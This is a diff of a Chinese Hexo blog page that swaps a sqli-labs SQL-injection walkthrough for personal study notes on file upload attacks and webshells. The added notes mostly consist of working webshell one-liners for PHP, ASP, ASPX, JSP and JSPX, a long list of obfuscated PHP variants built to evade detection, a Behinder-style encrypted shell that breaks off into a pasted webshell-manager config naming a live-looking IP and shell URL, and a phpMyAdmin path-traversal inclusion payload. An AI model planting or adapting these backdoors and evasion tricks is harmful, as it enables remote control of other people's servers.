@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      sqli-labs前1-3关 | Hexo
+      文件上传,包含 | Hexo
     
   </title>
   <meta name="author" content="John Doe">
@@ -100,7 +100,7 @@
 	<!-- Page title -->
 	<p>
 		
-			「sqli-labs前1-3关」
+			「文件上传,包含」
 		
 	</p>
 
@@ -229,8 +229,8 @@
 	<div id="layout-post">
 		<div class="article-title">
 			
-	<a href="/2022/03/25/sqli-labs-1-3/" itemprop="url">
-		sqli-labs前1-3关
+	<a href="/2022/04/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,%E5%8C%85%E5%90%AB/" itemprop="url">
+		文件上传,包含
 	</a>
 
 		</div>
@@ -246,9 +246,9 @@
 
 	更新于
 
-	<a href="/2022/03/25/sqli-labs-1-3/" itemprop="url">
-		<time datetime="2022-03-25T06:53:38.550Z" itemprop="dateUpdated">
-	  		2022-04-07
+	<a href="/2022/04/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,%E5%8C%85%E5%90%AB/" itemprop="url">
+		<time datetime="2022-04-27T03:14:32.239Z" itemprop="dateUpdated">
+	  		2022-05-04
 	  </time>
 	</a> 
 
@@ -266,55 +266,263 @@
 		</div>
 
 		<div class="article-content" id="article-content">
-			<p>date: 2022-03-25 14:53:38<br>tags:</p>
+			<p>date: 2022-04-27 11:14:32<br>tags:</p>
 <hr>
-<p>###第一关</p>
-<img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325124357.png" class>
-<p>根据页面提示需要加入一个数字参数，直接加入?id&#x3D;1</p>
-<img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325124432.png" class>
-<p>输入and 1&#x3D;1 来进行判断，显示正常</p>
-<img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325124502.png" class>
-<p>直接输入单引号看是否会提示报错</p>
-<img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325124523.png" class>
-<p>出现报错 <br><br>输入 ‘  and ‘1’ &#x3D;‘1闭合后，回显正确</p>
-<img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325124824.png" class>
-<p>已经测试了存在注入，现在就开始使用 order by 猜解字段数了,正确是3个字段数</p>
-<img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325130005.png" class>
-<img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325130048.png" class>
-<p><em><strong>使用union  select进行联合查询，再加入-号或者and 1&#x3D;2让其报错</strong></em></p>
-<img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325130142.png" class>
-<p>介绍几个函数：</p>
-<p>　　（1）version（）：查看数据库版本</p>
-<p>　　（2）user（）：查看当前用户</p>
-<p>　　（3）database（）：查看使用的数据库</p>
-<p>　　（4） limit  :limit子句来分批获取所有数据</p>
-<p>　　（5）group_concat（）：一次性获取数据库信息。<br><br><br>查看当前用户,数据库。版本<br>  <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325130250.png" class><br>  <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325130320.png" class><br>  <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325130340.png" class><br>接下来表名，列名，数据<br>  <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325132238.png" class><br>代码</p>
+<img src="/2022/04/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,%E5%8C%85%E5%90%AB/%E8%85%BE%E8%AE%AF%E4%BC%9A%E8%AE%AE%E5%9B%BE%E7%89%87_20220411140053.png" class>
+
+<p>文件上传</p>
+<pre><code>原理：
+
+补充
+
+webshell分类
+
+    一句话木马：代码量小，需要和webshell管理工具配合使用；    
+        php:&lt;?php @eval($_POST[_]);?&gt; &lt;?php @assert($_POST[_]);?&gt;
+        asp：&lt;% eval request(&quot;k&quot;)%&gt;
+        aspx:
+            &lt;%@ Page Language=&quot;Jscript&quot;%&gt;
+            &lt;%eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;);%&gt;
+        jsp:
+            &lt;%!class U extends ClassLoader&#123; U(ClassLoader c)&#123; super(c); &#125;public Class g(byte []b)&#123; return super.defineClass(b,0,b.length); &#125;&#125;%&gt;&lt;% String cls=request.getParameter(&quot;ant&quot;);if(cls!=null)&#123; new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); &#125;%&gt;
+        jspx:
+            *********************************
+                            &lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;
+                &lt;jsp:declaration&gt;
+                    class U extends ClassLoader &#123;
+                        U(ClassLoader c) &#123;
+                            super(c);
+                        &#125;
+                        public Class g(byte[] b) &#123;
+                            return super.defineClass(b, 0, b.length);
+                        &#125;
+                    &#125;
+                    public byte[] base64Decode(String str) throws Exception &#123;
+                        try &#123;
+                            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);
+                            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);
+                        &#125; catch (Exception e) &#123;
+                            Class clazz = Class.forName(&quot;java.util.Base64&quot;);
+                            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);
+                            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);
+                        &#125;
+                    &#125;
+                &lt;/jsp:declaration&gt;
+                &lt;jsp:scriptlet&gt;
+                    String cls = request.getParameter(&quot;ant&quot;);
+                    if (cls != null) &#123;
+                        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+                    &#125;
+                &lt;/jsp:scriptlet&gt;
+            &lt;/jsp:root&gt;
+</code></pre>
+<hr>
+<pre><code>    小马：功能单一（文件上传、命令执行等），通常和大马结合使用；
+    大马：功能较多，代码量大，隐蔽性差，常见功能有文件管理、虚拟终端、数据库管理、提权、信息收集等
+    内存马：扩展（php+.net+java+python等）
+
+&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;
+&lt;?php ?&gt;   &lt;? ?&gt;
+@屏蔽错误
+eval() php函数，解析字符串类型的php代码（使用标准的PHP语法写的代码） $str=&quot;phpinfo();&quot;
+$_POST[&quot;cmd&quot;] 以POST方式接受cmd的值
+$_GET[&quot;cmd&quot;]
+$_REQUEST[&quot;cmd&quot;] *****
+
+website
+源码所在的位置，document_root
+/var/www/html
+E:\phpStudy2018\PHPTutorial\WWW
+</code></pre>
+<p>webshell管理工具（三大功能：文件管理+虚拟终端+数据库管理）</p>
+<pre><code>中国菜刀
+中国蚁剑
+冰蝎
+哥斯拉
+等等
+</code></pre>
+<p>将木马文件（webshell，必须根据服务器类型上传对应类型木马）上传到目标服务器，知道其位置，然后去访问</p>
+<pre><code>    IIS:ASP ASPX等
+    WAMP/LAMP/WNMP(windows+nginx+mysql+php)/lnmp: php 
+    tomcat/jboss/weblogic:jsp 
+    flask python:py
+
+http://192.168.10.100:88/webshell.php
+浏览器：
+    hackbar f12
+    foxproxy
+    web developer
+
+phpinfo() 是PHP函数，PHP配置环境参数
+&lt;?php @eval($_POST[&quot;k&quot;]);?&gt;
+POST：k=phpinfo();
+$_POST[&quot;k&quot;]=&quot;phpinfo();&quot;
+&lt;?php @eval(&quot;phpinfo();&quot;);？&gt;
+
+k=system(&quot;net user&quot;);
+exec();
+shell_exec()
+``    
+等等
+
+在webshell里权限取决于web站点的权限
+http://123.58.236.76:54312/hackable/uploads/shell.php
+
+链接数据库：ip:port  账号 密码 
+web+DB
+web db 分开
+
+getshell:获取到站点权限；
+配置文件：conf.php conf.ini.php 等等
+
+&lt;T&gt;MYSQL&lt;/T&gt;  数据库类型
+&lt;H&gt;localhost&lt;/H&gt; ip:port
+&lt;U&gt;root&lt;/U&gt; 账号
+&lt;P&gt;&lt;/P&gt; 密码
+&lt;L&gt;utf8&lt;/L&gt; 编码
+
+antsowrd=loader+js源码
+
+JDK
+JDK8
+JDK14
+JDK17
+java -jar xxx.jar
+</code></pre>
+<hr>
+<pre><code>密码学
+    密码编码学
+        密码分类：
+            古典密码
+            近代密码
+            现在密码
+                对称：
+                非对称：
+                散列：
+                序列密码:
+                PKI
+                等
+    密码分析学 
+</code></pre>
+<p>webshell变形</p>
+<pre><code>基础变形
+    (1)str_replase 
+        $a=str_replace(&quot;x&quot;,&quot;&quot;,&quot;axxxsxsxexrxt&quot;);
+        $a($_POST[&quot;cmd&quot;]);
+    (2)拼接
+        $_GET[&quot;k&quot;]($_GET[&quot;v&quot;])
+        k=assert&amp;v=phpinfo();
+
+        http://192.168.10.100:88/index123.php?k=assert&amp;v=@eval($_POST[k]);
+
+        $_POST[&quot;k&quot;]($_POST[&quot;v&quot;])
+    (3)preg_replace /e
+        &lt;?php preg_relace(&quot;/p/e&quot;,&#39;$_POST[&quot;k&quot;]&#39;,&quot;pentest&quot;);?&gt;
+
+    (4)create_function()
+        &lt;?php 
+            $fun=create_function(&quot;&quot;,$_POST[&#39;a&#39;]);
+            $fun();
+        ?&gt;
+    (5)call_user_func()
+        &lt;?php call_user_func(assert,$_POST[&#39;a&#39;]);?&gt;
+    (6)js型的PHP webshell
+    &lt;script language=php&gt;@eval($_POST[&#39;web&#39;]);&lt;/script&gt;
+
+高级变形
+    （1）php可变变量
+        &lt;?php $bb=&quot;eval&quot;; $a=&quot;bb&quot;;$$a($_POST[&quot;A&quot;]);?&gt;
+    （2）base64_decode /str_rot13
+        &lt;?php $a=base64_decode(&quot;YXNzZXJ0&quot;);$a($_POST[&quot;A&quot;]);?&gt;
+    (3). 拼接
+        $a=&quot;a&quot;;
+        $b=$a.&quot;sser&quot;;
+        $c=$b.&quot;t&quot;;
+        $c($_POST[&quot;A&quot;]);
+    （4）数组拼接
+        $__C_C=&quot;WlhaaGJDZ2tYMUJQVTFSYmVGMHBPdz09&quot;;
+        $__P_P=&quot;abcdefghijklmnopqrstuvwxyz&quot;;
+        $__X_X=&quot;123456789&quot;;
+        $__O_O=$__X_X[5].$__X_X[3].&quot;_&quot;;//64_
+        $__B_B=$__P_P&#123;1&#125;.$__P_P[0].$__P_P[18].$__P_P[4];//base
+        $__H_H=$__B_B.$__O_O.$__P_P[3].$__P_P[4].$__P_P[2].$__P_P[14].$__P_P[3].$__P_P[4];//base64_decode
+        $__E_E=$__P_P[4].$__P_P[21].$__P_P[0].$__P_P[11];//enco
+        $__F_F=$__P_P[2].$__P_P[17].$__P_P[4].$__P_P[0].$__P_P[19].$__P_P[4];
+        $__F_F.=&#39;_&#39;.$__P_P[5].$__P_P[20].$__P_P[13].$__P_P[2].$__P_P[19].$__P_P[8].$__P_P[14].$__P_P[13];
+        $_[00]=$__F_F(&#39;$__S_S&#39;,$__E_E.&#39;(&quot;$__S_S&quot;);&#39;);
+        @$_[00]($__H_H($__H_H($__C_C)));
+
+    (5)&#123; &#125;
+        $tk = array(&quot;a&quot;=&gt;&quot;assert&quot;);
+        $a = &quot;$&#123;$tk[&quot;a&quot;]($_POST[a])&#125;&quot;;
+
+    (6)反序列化
+        &lt;?php
+              class Blog
+              &#123;
+                 var $vul = &#39;&#39;;
+                 function __destruct() #析构函数
+                     &#123;
+                            eval($this-&gt;vul);
+                     &#125;
+              &#125;
+              unserialize($_GET[&#39;name&#39;]);
+        ?&gt; 
+    (7)uasort php&gt;5.4 
+    使用用户自定义的比较函数对素组中元素按照键值去排序，
+        $a=$_REQUEST[&quot;k1&quot;];
+        $b=array(&#39;test&#39;,$_REQUEST[&quot;k2&quot;]);
+        uasort($b,$a);
+
+        $a 恶意函数 assert    ----&gt;k1 =assert
+        $b php代码           ----&gt;k2=phpinfo();
+        Cream
+        http://192.168.2.101/eee.php?name=O:4:&quot;Blog&quot;:1:&#123;s:3:&quot;vul&quot;;s:10:&quot;phpinfo();&quot;;&#125;
+
+        http://192.168.10.100:88/index123.php?k1=assert&amp;k2=phpinfo();
+    （8）加密变形
+        &lt;?php
+            if(isset($_POST[&#39;com&#39;])&amp;&amp;md5($_POST[&#39;com&#39;])== &#39;202cb962ac59075b964b07152d234b70&#39;&amp;&amp; isset($_POST[&#39;content&#39;]))
+            $content = strtr($_POST[&#39;content&#39;], &#39;-_,&#39;, &#39;+/=&#39;);eval(base64_decode($content));
+        ?&gt;
+
+    （9）加密拼接        
+        &lt;?php 
+            $_uU=chr(99).chr(104).chr(114);
+            $_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);
+            $_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);
+            $_=$_fF(&quot;&quot;,$_cC);@$_();
+        ?&gt;
+    （10）冰蝎和哥斯拉带的木马或者生成的木马
+        &lt;?php
+            @error_reporting(0);
+            session_start();
+            $key=&quot;cbff36039c3d0212&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
+            $_SESSION[&#39;k&#39;]=$key;
+            $post=file_get_contents(&quot;php://input&quot;);//接受用户端发送来的数据
+            if(!extension_loaded(&#39;openssl&#39;))
+            &#123;
+                $t=&quot;base64_&quot;.&quot;decode&quot;;
+                $post=$t($post.&quot;&quot;);
+    
+                for($i=0;$i&lt;strlen($post);$i++) &#123;
+                    $post[$i] = $post[$i]^$key[$i+1&amp;15]; 
+                &#125;
+            &#125;
+            else
+            &#123; 
+            &#123;&quot;_id&quot;:&quot;dizJZVOquM2KMlrn&quot;,&quot;addr&quot;:&quot;美国  CZ88.NET&quot;,&quot;category&quot;:&quot;default&quot;,&quot;ctime&quot;:1649727126182,&quot;decoder&quot;:&quot;base64&quot;,&quot;encode&quot;:&quot;UTF8&quot;,&quot;encoder&quot;:&quot;base64&quot;,&quot;httpConf&quot;:&#123;&quot;body&quot;:&#123;&#125;,&quot;headers&quot;:&#123;&#125;&#125;,&quot;ip&quot;:&quot;158.247.233.5&quot;,&quot;note&quot;:&quot;&quot;,&quot;otherConf&quot;:&#123;&quot;add-MassData&quot;:0,&quot;chunk-step-byte-max&quot;:&quot;3&quot;,&quot;chunk-step-byte-min&quot;:&quot;2&quot;,&quot;command-path&quot;:&quot;&quot;,&quot;custom-datatag-tage&quot;:&quot;&quot;,&quot;custom-datatag-tags&quot;:&quot;&quot;,&quot;filemanager-cache&quot;:1,&quot;ignore-https&quot;:0,&quot;random-Prefix&quot;:&quot;2&quot;,&quot;request-timeout&quot;:&quot;10000&quot;,&quot;terminal-cache&quot;:0,&quot;upload-fragment&quot;:&quot;500&quot;,&quot;use-chunk&quot;:0,&quot;use-custom-datatag&quot;:0,&quot;use-multipart&quot;:0,&quot;use-random-variable&quot;:0&#125;,&quot;pwd&quot;:&quot;cmd&quot;,&quot;type&quot;:&quot;php&quot;,&quot;url&quot;:&quot;http://158.247.233.5:62692/upload/webshell.php&quot;,&quot;utime&quot;:1649727224737&#125; 
+</code></pre>
+<img src="/2022/04/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,%E5%8C%85%E5%90%AB/412-1QQ%E6%88%AA%E5%9B%BE20220421092033.png" class>
+<img src="/2022/04/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,%E5%8C%85%E5%90%AB/QQ%E6%88%AA%E5%9B%BE20220412090633.png" class>
+<img src="/2022/04/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,%E5%8C%85%E5%90%AB/QQ%E6%88%AA%E5%9B%BE20220412145001.png" class>
+<img src="/2022/04/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,%E5%8C%85%E5%90%AB/QQ%E6%88%AA%E5%9B%BE20220412152116.png" class>
 
 
-<img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325133857.png" class>
-<p>代码</p>
-
- <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325134949.png" class>
-<p>代码</p>
-
-
-<p>###第二关</p>
-<p>根据页面提示需要加入一个数字参数，直接加入?id&#x3D;1<br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325135418.png" class><br>输入and 1&#x3D;2 来进行判断，显示正常<br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325135855.png" class><br>直接输入单引号看是否会提示报错<br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325135443.png" class><br>出现报错 <br><br>已经测试了存在注入，现在就开始使用 order by 猜解字段数了,正确是3个字段数<br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325135740.png" class><br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325135756.png" class><br><em><strong>使用union  select进行联合查询，再加入-号</strong></em><br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325140114.png" class><br><br><br>查看当前用户,数据库。版本<br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325140145.png" class><br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325140205.png" class><br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325140227.png" class><br>接下来表名，列名，数据<br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325140430.png" class><br>代码</p>
-
- <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325140909.png" class>
-<p>代码</p>
-
- <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325141013.png" class>
-<p>代码</p>
-
-<p>###第三关</p>
-<p>根据页面提示需要加入一个数字参数，直接加入?id&#x3D;1<br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325141618.png" class><br>输入and 1&#x3D;2 来进行判断，显示正常<br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325141702.png" class><br>直接输入单引号看是否会提示报错<br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325141739.png" class><br>出现报错 <br><br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325142135.png" class><br>已经测试了存在注入，现在就开始使用 order by 猜解字段数了,正确是3个字段数<br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325142200.png" class><br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325142221.png" class><br><em><strong>使用union  select进行联合查询，再加入-号</strong></em><br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325142336.png" class><br><br><br>查看当前用户,数据库。版本<br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325142456.png" class><br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325142424.png" class><br>接下来表名，列名，数据<br> <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325143101.png" class><br>代码</p>
-
- <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325143149.png" class>
-<p>代码</p>
-
- <img src="/2022/03/25/sqli-labs-1-3/QQ%E6%88%AA%E5%9B%BE20220325143234.png" class>
-<p>代码</p>
+<p>补充</p>
+<hr>
+<p>&#x2F;pma&#x2F;gis_data_editor.php?token&#x3D;xxxx&amp;gis_data[gis_type]&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;info.php%00 </p>
+<p>&#x2F;gis_data_editor.php?<br><br><br>token&#x3D;2941949d3768c57b4342d94ace606e91<br><br><br>&amp;gis_data[gis_type]&#x3D; &#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;phpinfo.txt%00    # 注意改下token值 </p>
 	
 		</div>
 		
@@ -333,12 +541,12 @@
 	<span>
 		<a id="totop-post-page">返回顶部</a>
 		
-			<a href="/2022/04/07/php-cookies-session/" title="php,cookies,session,mysql" rel="prev">
+			<a href="/2022/05/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E5%8C%85%E5%90%AB%E3%80%81XSS/" title="文件上传、包含、XSS" rel="prev">
 				&laquo;上一篇
 			</a>
 		
 		
-			<a href="/2022/03/14/my-first-blog/" title="my-first-blog" rel="next">
+			<a href="/2022/04/07/php-cookies-session/" title="php,cookies,session,mysql" rel="next">
 				下一篇&raquo;
 			</a>
 			
@@ -419,40 +627,6 @@
 			
 					<li>
 						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2022/04/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,%E5%8C%85%E5%90%AB/" title="文件上传,包含">
-								文件上传,包含			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								四月 27日, 2022				
-							</p>
-							<p class="relate-post-content">
-								date: 2022-04-27 11:14:32tags:
-
-
-
-文件上传
-原理：
-
-补充
-
-webshell分类
-
-    一句话木马：代码量小，需要和webshell管理工具配合使用；    
-        php:&lt;?...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2022/04/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,%E5%8C%85%E5%90%AB/" title="文件上传,包含">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="文件上传,包含"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
 							<a class="relate-post-title" href="/2022/04/07/php-cookies-session/" title="php,cookies,session,mysql">
 								php,cookies,session,mysql			
 							</a>
@@ -510,6 +684,38 @@ webshell分类
 							<a href="/2022/04/07/php-cookies-session/" title="php,cookies,session,mysql">				
 								
 								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="php,cookies,session,mysql"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/03/25/sqli-labs-1-3/" title="sqli-labs前1-3关">
+								sqli-labs前1-3关			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 25日, 2022				
+							</p>
+							<p class="relate-post-content">
+								date: 2022-03-25 14:53:38tags:
+
+###第一关
+
+根据页面提示需要加入一个数字参数，直接加入?id&#x3D;1
+
+输入and 1&#x3D;1 来进行判断，显示正常
+
+直接输入单引号看是否会提示报错
+
+...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/03/25/sqli-labs-1-3/" title="sqli-labs前1-3关">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="sqli-labs前1-3关"/>
 							</a>
 						</div>
 					</li>												
